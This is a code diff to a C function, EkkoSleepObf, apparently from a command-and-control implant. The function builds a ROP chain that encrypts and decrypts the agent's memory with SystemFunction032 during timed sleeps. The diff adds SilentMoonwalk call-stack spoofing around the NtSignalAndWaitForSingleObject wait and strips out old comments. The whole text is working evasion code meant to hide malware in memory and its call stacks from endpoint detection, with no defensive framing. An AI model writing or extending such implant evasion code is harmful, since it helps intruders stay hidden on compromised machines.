@@ -101,19 +101,7 @@ BOOL EkkoSleepObf(
                         Rop[i].Rip = (UINT_PTR)JmpGadget; //set RIP to null for right now. More useful for when i have a JmpGadget.
                         Rop[i].Rsp -= sizeof(PVOID);
                     }
-                    /*
-                    Args args;
-                    args.Nargs = 3;
-                    args.Arg01 = (UINT_PTR)EvntStart;
-                    args.Arg02 = (UINT_PTR)INFINITE;
-                    args.Arg03 = (UINT_PTR)0; // FALSE.
 
-
-                    Rop[Inc].Rip = (UINT_PTR)SilentMoonwalkMain;
-                    Rop[Inc].Rcx = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
-                    Rop[Inc].Rdx = (UINT_PTR)&args;
-                    Inc++;
-                    */
                     /* start rop chain with WaitForSingleObject. */
                     Rop[Inc].Rip = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
                     Rop[Inc].Rcx = (UINT_PTR)EvntStart;
@@ -141,7 +129,6 @@ BOOL EkkoSleepObf(
                     Inc++;
 
 
-                    //TODO  stack spoof for rop chain
                                         /* perform stack spoofing */
 
                     Rop[Inc].Rip = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
@@ -150,7 +137,6 @@ BOOL EkkoSleepObf(
                     Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
                     Inc++;
 
-                    /* TODO undo stack spoof */
 
                     /* Decrypt */
                     Rop[Inc].Rip = (UINT_PTR)agent->apis->pSystemFunction032;
@@ -191,11 +177,27 @@ BOOL EkkoSleepObf(
                         }
                     }
 
+                    Args args = { 0 };
+                    args.Arg01 = EvntStart;
+                    args.Arg02 = EvntDelay;
+                    args.Arg03 = FALSE;
+                    args.Arg04 = NULL;
+                    args.Nargs = 4;
+
+                    agent->Walker->Arguments = &args;
+                    agent->Walker->FunctionPointer = agent->apis->pNtSignalAndWaitForSingleObject;
+
+                    //stack spoofing enabled.
+                    SilentMoonwalkMain(agent->Walker->FunctionPointer, agent->Walker->Arguments, agent->Walker->RetAddr);
+
                     /* Wait for the sleep to end*/
-                    if ((NtStatus = agent->apis->pNtSignalAndWaitForSingleObject(EvntStart, EvntDelay, FALSE, NULL)) < 0)
-                    {
-                        printf("[error] NtSignalAndWaitForSingleObject failed: %lx\n", NtStatus);
-                    }
+                    //if ((NtStatus = agent->apis->pNtSignalAndWaitForSingleObject(EvntStart, EvntDelay, FALSE, NULL)) < 0) {
+                    //    printf("[error] NtSignalAndWaitForSingleObject failed: %lx\n", NtStatus);
+                   //}
+                    //else {
+                        Success = TRUE;
+
+                    //}
                 }
                 else {
                     printf("[error] failed to create timer. %lx\n", NtStatus);
